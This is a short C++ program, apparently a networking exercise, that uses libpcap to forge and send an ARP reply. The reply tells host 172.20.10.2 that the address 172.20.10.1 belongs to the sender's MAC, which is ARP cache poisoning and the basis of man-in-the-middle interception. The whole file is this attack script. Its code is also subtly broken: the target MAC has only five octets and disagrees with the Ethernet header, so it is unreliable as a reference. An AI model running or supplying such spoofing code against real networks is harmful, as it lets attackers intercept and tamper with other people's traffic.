#include "ethh.h"
#include "arph.h"
#include "ip.h"

int main(int argc, char *argv[]){

    /*for(int i = 0; i < 6; i++) {
        std::cout << std::hex << (int)m.mac[i];
    }*/


    struct etharpPacket{
        ethH eth;
        arpH arp;
    };
    etharpPacket packet;

    char err[PCAP_BUF_SIZE];

    pcap_t* pcap = pcap_open_live(argv[1],0,0,0,err);

    packet.eth.smac = Mac("48:51:b7:68:9f:a2");
    packet.eth.dmac = Mac("8C:55:4A:43:14:35");
    packet.eth.etype = htons(0x0806);//arp

    packet.arp.h_type = htons(0x0001);//ethernet
    packet.arp.p_type = htons(0x0800);//ipv4
    packet.arp.h_length = 0x06; //mac
    packet.arp.p_length = 0x04; //ipv4
    packet.arp.op_code = htons(0x0002); //reply
    packet.arp.smac = Mac("48:51:b7:68:9f:a2");

    packet.arp.sip = htonl(Ip("172.20.10.1"));
    packet.arp.tmac = Mac("8C:55:4A:14:35");
    packet.arp.tip = htonl(Ip("172.20.10.2"));




    pcap_sendpacket(pcap,reinterpret_cast<u_char*>(&packet),sizeof(etharpPacket)); // gudqusghks
    pcap_close(pcap);

}
